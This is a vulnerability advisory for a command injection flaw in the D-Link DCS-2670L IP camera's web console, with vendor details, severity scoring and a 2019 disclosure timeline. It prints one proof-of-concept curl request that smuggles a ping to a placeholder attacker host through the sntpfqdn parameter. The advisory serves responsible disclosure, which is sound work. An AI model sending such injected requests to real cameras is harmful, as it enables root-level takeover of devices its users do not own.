# Advisory

## Description
The D-Link DCS-2670L IP camera is vulnerable to a command injection flaw. An attacker who has access to the camera’s web console can gain control of the camera on the Operating System level.

## Vendor details
D-Link is a global leader in designing and developing networking and connectivity products for consumers, small businesses, medium to large-sized enterprises, and service providers. From relatively modest beginnings in Taiwan, the company has grown since 1986 into an award-winning global brand with over 2000 employees in 60 countries.

## Other affected products
The vulnerability was tested on a model DCS-2670L camera, but other products sharing the same firmware codebase are likely affected too.

## Vulnerablity type
Command Injection

## Affected component
The camera’s web-based console is affected

## Attack Vectors
An attacker having access to the camera web console can exploit this vulnerability to gain a root shell.

## Vulnerability details
The sntpfqdn  query variable of the vb.htm page is vulnerable to injection of commands, as can demonstrated by the following cURL command:
```
curl -i -s -k -X $'GET' \
    -H $'Host: <camera_ip>' -H $'Connection: close' \
    $'http://<camera_ip>/vb.htm?language=ie&fj_datetime=&wintimezone=69&timefrequency=1&sntpfqdn=a%3bping+-c+1+<attacker_ip>&setdaylight=0'
```
On the attacker host an ICMP echo request can be observed, indicating that the injected ping command is successfully executed.

PoC exploit code dropping the attacker into a root shell is available upon request.

## Severity
CVSSv3 Base Score: *7.2* (high)

* Attack Vector: Network
* Attack Complexity: Low
* Privilege Required: High
* User Interaction: None
* Scope: Unchanged
* Confidentiality: High
* Integrity: High
* Availablity: High
* Vector string: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

## Reference
https://github.com/Alcyon/vulnerability-reports/d-link-ip-camera-command-injection.md

## Discoverer
Mattijs van Ommeren

## Disclosure timeline
June 13, 2019 – vulnerability discovered and PoC exploit code developed
June 15, 2019 – vulnerability reported to vendor, through http://us.dlink.com/security-advisories/report-vulnerabilities/




